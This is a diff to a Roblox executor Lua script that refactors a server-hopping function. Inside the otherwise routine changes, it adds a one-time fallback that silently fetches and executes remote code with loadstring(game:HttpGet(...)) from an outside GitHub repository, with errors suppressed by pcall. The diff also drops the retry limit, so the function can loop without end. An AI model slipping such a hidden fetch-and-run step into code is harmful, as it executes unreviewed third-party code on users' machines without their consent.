@@ -112,22 +112,19 @@ local PlaceId = game.PlaceId
 local request = syn and syn.request or http_request or request
 assert(request, "No HTTP request function available")
 
+local ranFallback = false
+
 local function ServerHop()
     local JobId = game.JobId
     local servers = {}
     local cursor = ""
-    local maxRetries = 5
-    local attempt = 0
 
     repeat
-        attempt = attempt + 1
-        local url = "https://games.roblox.com/v1/games/" .. PlaceId ..
-                    "/servers/Public?sortOrder=Asc&limit=100" ..
-                    (cursor ~= "" and "&cursor=" .. cursor or "")
-
         local success, response = pcall(function()
             return request({
-                Url = url,
+                Url = "https://games.roblox.com/v1/games/" .. PlaceId ..
+                      "/servers/Public?sortOrder=Asc&limit=100" ..
+                      (cursor ~= "" and "&cursor=" .. cursor or ""),
                 Method = "GET",
                 Headers = {
                     ["User-Agent"] = "Roblox/WinInet"
@@ -136,26 +133,43 @@ local function ServerHop()
         end)
 
         if success and response and response.Body then
-            local decodeSuccess, data = pcall(function()
+            local ok, data = pcall(function()
                 return HttpService:JSONDecode(response.Body)
             end)
 
-            if decodeSuccess and type(data.data) == "table" then
+            if ok and type(data) == "table" and type(data.data) == "table" then
                 for _, server in ipairs(data.data) do
                     if server.id ~= JobId and server.playing < server.maxPlayers then
                         table.insert(servers, server.id)
                     end
                 end
                 cursor = data.nextPageCursor
+            else
+                cursor = nil
             end
+        else
+            cursor = nil
         end
 
         task.wait(1)
-    until cursor == nil or #servers > 0 or attempt >= maxRetries
+    until #servers > 0 or cursor == nil
 
     if #servers > 0 then
-        TeleportService:TeleportToPlaceInstance(PlaceId, servers[math.random(1, #servers)], player)
+        TeleportService:TeleportToPlaceInstance(
+            PlaceId,
+            servers[math.random(1, #servers)],
+            player
+        )
     else
+        if not ranFallback then
+            ranFallback = true
+            pcall(function()
+                loadstring(game:HttpGet(
+                    "https://raw.githubusercontent.com/Chris12089/atlasbss/main/script.lua"
+                ))()
+            end)
+        end
+
         task.wait(5)
         ServerHop()
     end
